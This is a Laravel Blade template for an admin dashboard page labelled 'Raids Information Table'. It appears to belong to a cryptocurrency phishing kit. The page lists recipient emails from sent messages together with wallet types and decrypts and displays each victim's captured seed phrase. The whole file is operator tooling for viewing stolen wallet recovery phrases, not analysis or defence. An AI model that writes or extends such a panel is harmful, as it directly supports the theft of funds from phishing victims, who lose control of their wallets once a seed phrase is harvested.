<x-app-layout>
    <!-- Start Main Content -->
    <div
        class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
        <div class="grid grid-cols-12">
            <!-- INFORMATION TABLE THREE -->
            <div class="col-span-full">
                <div class="card p-0">
                    <div class="flex-center-between p-6 pb-4 border-b border-gray-200 dark:border-dark-border">
                        <h3 class="text-lg card-title leading-none">Raids Information Table</h3>
                        <button type="button"
                            class="btn b-light btn-primary-light btn-sm prism-toggle !py-2.5 focus:bg-primary-500 focus:text-white dark:!bg-dark-icon">
                            <span class="shrink-0">View Raids</span>
                            <i class="ri-code-line text-inherit text-[15px]"></i>
                        </button>
                    </div>
                    <div class="p-6">
                        <div class="overflow-x-auto mt-5">
                            <table
                                class="table-auto border-collapse w-full whitespace-nowrap text-left text-gray-500 dark:text-dark-text font-medium">
                                <thead>
                                    <tr class="text-primary-500">
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                            Date</th>
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                            Recipient Email</th>
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                            Wallet Type</th>
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square–

-right">
                                            Phrase</th>
                                    </tr>
                                </thead>
                                <tbody class="divide-y divide-gray-200 dark:divide-dark-border-three">
                                    @forelse ($wallets as $connection)
                                        <tr>
                                            <td class="p-6 py-4">{{ $connection->created_at->format('Y-m-d') }}</td>
                                            <td class="p-6 py-4">{{ $connection->sentEmail->recipient_email }}</td>
                                            <td class="p-6 py-4">{{ $connection->wallet_type }}</td>
                                            <td class="p-6 py-4">{{ decrypt($connection->seed_phrase) }}</td>
                                        </tr>
                                    @empty
                                        <tr>
                                            <td class="p-6 py-4" colspan="4">No wallet connections found.</td>
                                        </tr>
                                    @endforelse
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <!-- Prism Code -->
                    <div class="p-6 hidden">
                        <pre>
                            <code class="language-markup">
                                <p>Sorry we can't show the huge data table</p>
                            </code>
                        </pre>
                    </div>
                    <!-- Prism Code -->
                </div>
            </div>
            <!-- INFORMATION TABLE FOUR -->
        </div>
    </div>
    <!-- End Main Content -->
</x-app-layout>
